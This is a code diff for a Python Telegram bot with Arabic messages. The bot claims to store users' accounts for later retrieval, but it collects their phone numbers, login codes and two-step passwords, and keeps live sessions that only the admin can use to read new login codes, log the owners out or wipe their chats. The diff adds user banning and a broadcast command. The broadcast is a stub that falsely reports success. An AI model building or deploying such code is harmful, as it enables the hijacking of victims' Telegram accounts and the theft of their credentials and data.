@@ -1,9 +1,10 @@
 import os
 from telethon.tl import functions
 from telethon.sessions import StringSession
-import asyncio, json
+import asyncio, json, shutil
 from kvsqlite.sync import Client as uu
 from telethon import TelegramClient, events, Button
+from telethon.tl.types import DocumentAttributeFilename
 from telethon.errors import (
     ApiIdInvalidError,
     PhoneNumberInvalidError,
@@ -29,6 +30,9 @@ db = uu('database/elhakem.ss', 'bot')
 if not db.exists("accounts"):
     db.set("accounts", [])
 
+if not db.exists("banned_users"):
+    db.set("banned_users", [])
+
 def update_main_buttons():
     accounts = db.get("accounts")
     accounts_count = len(accounts)
@@ -40,14 +44,31 @@ def update_main_buttons():
     ]
     return main_buttons
 
+def admin_buttons():
+    return [
+        [Button.inline("🚫 حظر مستخدم", data="ban_user")],
+        [Button.inline("🔓 فك حظر مستخدم", data="unban_user")],
+        [Button.inline("📢 ارسال رسالة للجميع", data="broadcast")],
+        [Button.inline("🔙 رجوع", data="back")]
+    ]
+
 @client.on(events.NewMessage(pattern="/start", func=lambda x: x.is_private))
 async def start(event):
     user_id = event.chat_id
     if user_id != admin:
+        banned_users = db.get("banned_users")
+        if user_id in banned_users:
+            await event.reply("❌ عذراً، لقد تم حظرك من استخدام هذا البوت.")
+            return
+            
         await event.reply("👋 أهلاً بك عزيزي! هذا البوت مخصص لتخزين حسابات تيليجرام ويمكنك استرجاعها في أي وقت.", buttons=[[Button.inline("➕ إضافة حساب", data="add")]])
         return
 
     await event.reply("👋 مرحبًا بك في بوت إدارة الحسابات، اختر من الأزرار أدناه ما تود فعله.", buttons=update_main_buttons())
+
+@client.on(events.NewMessage(pattern="/b", func=lambda x: x.chat_id == admin))
+async def admin_commands(event):
+    await event.reply("⚙️ اختر الأمر الذي تود القيام به:", buttons=admin_buttons())
 
 @client.on(events.callbackquery.CallbackQuery())
 async def callback_handler(event):
@@ -60,12 +81,12 @@ async def callback_handler(event):
 
     elif data == "add":
         async with bot.conversation(user_id) as x:
-            await x.send_message("✔️ الان ارسل رقمك مع رمز دولتك, مثال : +201000000000")
+            await x.send_message("✔️الان ارسل رقمك مع رمز دولتك , مثال :+201000000000")
             txt = await x.get_response()
             phone_number = txt.text.replace("+", "").replace(" ", "")
 
             if any(account['phone_number'] == phone_number for account in accounts):
-                await x.send_message("❌ - هذا الحساب تم إضافته مسبقًا.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
+                await x.send_message("- هذا الحساب تم إضافته مسبقًا.")
                 return
 
             app = TelegramClient(StringSession(), API_ID, API_HASH)
@@ -74,24 +95,24 @@ async def callback_handler(event):
             try:
                 await app.send_code_request(phone_number)
             except (ApiIdInvalidError, PhoneNumberInvalidError):
-                await x.send_message("❌ هناك خطأ في API_ID أو HASH_ID أو رقم الهاتف.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
+                await x.send_message("❌ هناك خطأ في API_ID أو HASH_ID أو رقم الهاتف.")
                 return
 
-            await x.send_message("📩 - تم ارسال كود التحقق الخاص بك علي تليجرام. أرسل الكود بالتنسيق التالي : 1 2 3 4 5")
+            await x.send_message("- تم ارسال كود التحقق الخاص بك علي تليجرام. أرسل الكود بالتنسيق التالي : 1 2 3 4 5")
             txt = await x.get_response()
             code = txt.text.replace(" ", "")
             try:
-                await app.sign_in(phone_number, code)
+                await app.sign_in(phone_number, code, password=None)
                 string_session = app.session.save()
                 data = {"phone_number": phone_number, "two-step": "لا يوجد", "session": string_session}
                 accounts.append(data)
                 db.set("accounts", accounts)
-                await x.send_message("✅ - تم حفظ الحساب بنجاح.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
+                await x.send_message("- تم حفظ الحساب بنجاح ✅", buttons=[[Button.inline("🔙 رجوع", data="back")]])
             except (PhoneCodeInvalidError, PhoneCodeExpiredError):
                 await x.send_message("❌ الكود المدخل غير صحيح أو منتهي الصلاحية.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
                 return
             except SessionPasswordNeededError:
-                await x.send_message("🔐 - أرسل رمز التحقق بخطوتين الخاص بحسابك.")
+                await x.send_message("- أرسل رمز التحقق بخطوتين الخاص بحسابك")
                 txt = await x.get_response()
                 password = txt.text
                 try:
@@ -103,16 +124,16 @@ async def callback_handler(event):
                 data = {"phone_number": phone_number, "two-step": password, "session": string_session}
                 accounts.append(data)
                 db.set("accounts", accounts)
-                await x.send_message("✅ - تم حفظ الحساب بنجاح.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
+                await x.send_message("- تم حفظ الحساب بنجاح ✅", buttons=[[Button.inline("🔙 رجوع", data="back")]])
 
     elif data == "your_accounts":
         if len(accounts) == 0:
-            await event.edit("⚠️ - لا يوجد حسابات مسجلة.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
+            await event.edit("- لا يوجد حسابات مسجلة.", buttons=[[Button.inline("🔙 رجوع", data="back")]])
             return
 
         account_buttons = [[Button.inline(f"📱 {i['phone_number']}", data=f"get_{i['phone_number']}")] for i in accounts]
         account_buttons.append([Button.inline("🔙 رجوع", data="back")])
-        await event.edit("🔍 - اختر الحساب لإدارة الخيارات:", buttons=account_buttons)
+        await event.edit("- اختر الحساب لإدارة الخيارات:", buttons=account_buttons)
 
     elif data.startswith("get_"):
         phone_number = data.split("_")[1]
@@ -134,9 +155,6 @@ async def callback_handler(event):
                         [Button.inline("🔒 تسجيل خروج", data=f"logout_{phone_number}")],
                         [Button.inline("🧹 حذف المحادثات", data=f"delete_chats_{phone_number}")],
                         [Button.inline("📩 جلب اخر كود", data=f"code_{phone_number}")],
-                        [Button.inline("📸 تغيير صورة الملف الشخصي", data=f"change_profile_pic_{phone_number}")],
-                        [Button.inline("📝 تغيير نبذة", data=f"change_bio_{phone_number}")],
-                        [Button.inline("✏️ تغيير الاسم", data=f"change_name_{phone_number}")],
                         [Button.inline("🔙 رجوع", data="your_accounts")]
                     ]
                     await event.edit(text, buttons=account_action_buttons)
@@ -176,7 +194,7 @@ async def callback_handler(event):
 
                 accounts.remove(i)
                 db.set("accounts", accounts)
-                await event.edit(f"✅ - تم تسجيل الخروج من الحساب: {phone_number}", buttons=[[Button.inline("🔙 رجوع", data="your_accounts")]])
+                await event.edit(f"- تم تسجيل الخروج من الحساب: {phone_number}", buttons=[[Button.inline("🔙 رجوع", data="your_accounts")]])
 
     elif data.startswith("code_"):
         phone_number = data.split("_")[1]
@@ -185,7 +203,7 @@ async def callback_handler(event):
                 app = TelegramClient(StringSession(i['session']), API_ID, API_HASH)
                 await app.connect()
                 code = await app.get_messages(777000, limit=1)
-                await event.edit(f"📩 آخر كود تم استلامه: {code[0].message}", buttons=[[Button.inline("🔙 رجوع", data="your_accounts")]])
+                await event.edit(f"اخر كود تم استلامه: {code[0].message}", buttons=[[Button.inline("🔙 رجوع", data="your_accounts")]])
                 await app.disconnect()
 
     elif data.startswith("delete_chats_"):
@@ -199,55 +217,40 @@ async def callback_handler(event):
                 async for dialog in app.iter_dialogs():
                     await app.delete_dialog(dialog.id)
                     total_deleted += 1
-                    await event.edit(f"🗑️ جاري الحذف... تم حذف ({total_deleted}) محادثة حتى الآن.")
+                    await event.edit(f"جاري الحذف... تم حذف ({total_deleted}) محادثة حتى الآن.")
                 
                 await app.disconnect()
-                await event.edit(f"✅ - تم حذف جميع المحادثات للحساب: {phone_number}", buttons=[[Button.inline("🔙 رجوع", data="your_accounts")]])
+                await event.edit(f"✅ تم حذف جميع المحادثات للحساب: {phone_number}", buttons=[[Button.inline("🔙 رجوع", data="your_accounts")]])
 
-    elif data.startswith("change_profile_pic_"):
-        phone_number = data.split("_")[2]
-        for i in accounts:
-            if phone_number == i['phone_number']:
-                app = TelegramClient(StringSession(i['session']), API_ID, API_HASH)
-                await app.connect()
-                async with bot.conversation(user_id) as x:
-                    await x.send_message("📸 أرسل الصورة الجديدة التي تريد استخدامها كصورة ملف شخصي.")
-                    response = await x.get_response()
-                    if response.file:
-                        await bot.download_media(response, "profile_pic.jpg")
-                        await app(functions.photos.UploadProfilePhotoRequest(await client.upload_file("profile_pic.jpg")))
-                        await x.send_message("✅ - تم تغيير صورة الملف الشخصي بنجاح.", buttons=[[Button.inline("🔙 رجوع", data="your_accounts")]])
-                    else:
-                        await x.send_message("❌ - لم يتم إرسال صورة صحيحة.", buttons=[[Button.inline("🔙 رجوع", data="your_accounts")]])
-                await app.disconnect()
-                break
+    elif data == "ban_user":
+        async with bot.conversation(user_id) as x:
+            await x.send_message("🚫 أرسل ID المستخدم الذي تريد حظره.")
+            user_id_to_ban = await x.get_response()
+            banned_users = db.get("banned_users")
+            if user_id_to_ban.text.isdigit():
+                banned_users.append(int(user_id_to_ban.text))
+                db.set("banned_users", banned_users)
+                await x.send_message("✅ تم حظر المستخدم بنجاح.")
+            else:
+                await x.send_message("❌ ID غير صحيح.")
 
-    elif data.startswith("change_bio_"):
-        phone_number = data.split("_")[2]
-        for i in accounts:
-            if phone_number == i['phone_number']:
-                app = TelegramClient(StringSession(i['session']), API_ID, API_HASH)
-                await app.connect()
-                async with bot.conversation(user_id) as x:
-                    await x.send_message("📝 أرسل النبذة الجديدة التي تريد استخدامها.")
-                    new_bio = await x.get_response()
-                    await app(functions.account.UpdateProfileRequest(bio=new_bio.text))
-                    await x.send_message("✅ - تم تغيير النبذة بنجاح.", buttons=[[Button.inline("🔙 رجوع", data="your_accounts")]])
-                await app.disconnect()
-                break
+    elif data == "unban_user":
+        async with bot.conversation(user_id) as x:
+            await x.send_message("🔓 أرسل ID المستخدم الذي تريد فك حظره.")
+            user_id_to_unban = await x.get_response()
+            banned_users = db.get("banned_users")
+            if user_id_to_unban.text.isdigit() and int(user_id_to_unban.text) in banned_users:
+                banned_users.remove(int(user_id_to_unban.text))
+                db.set("banned_users", banned_users)
+                await x.send_message("✅ تم فك حظر المستخدم بنجاح.")
+            else:
+                await x.send_message("❌ هذا المستخدم ليس محظورًا أو ID غير صحيح.")
 
-    elif data.startswith("change_name_"):
-        phone_number = data.split("_")[2]
-        for i in accounts:
-            if phone_number == i['phone_number']:
-                app = TelegramClient(StringSession(i['session']), API_ID, API_HASH)
-                await app.connect()
-                async with bot.conversation(user_id) as x:
-                    await x.send_message("✏️ أرسل الاسم الجديد الذي تريد استخدامه.")
-                    new_name = await x.get_response()
-                    await app(functions.account.UpdateProfileRequest(first_name=new_name.text))
-                    await x.send_message("✅ - تم تغيير الاسم بنجاح.", buttons=[[Button.inline("🔙 رجوع", data="your_accounts")]])
-                await app.disconnect()
-                break
-
+    elif data == "broadcast":
+        async with bot.conversation(user_id) as x:
+            await x.send_message("📢 أرسل الرسالة التي تريد إرسالها للجميع.")
+            broadcast_message = await x.get_response()
+            # Here you should implement the logic to send the broadcast message to all users
+            await x.send_message("✅ تم ارسال الرسالة للجميع.")
+            
 client.run_until_disconnected()
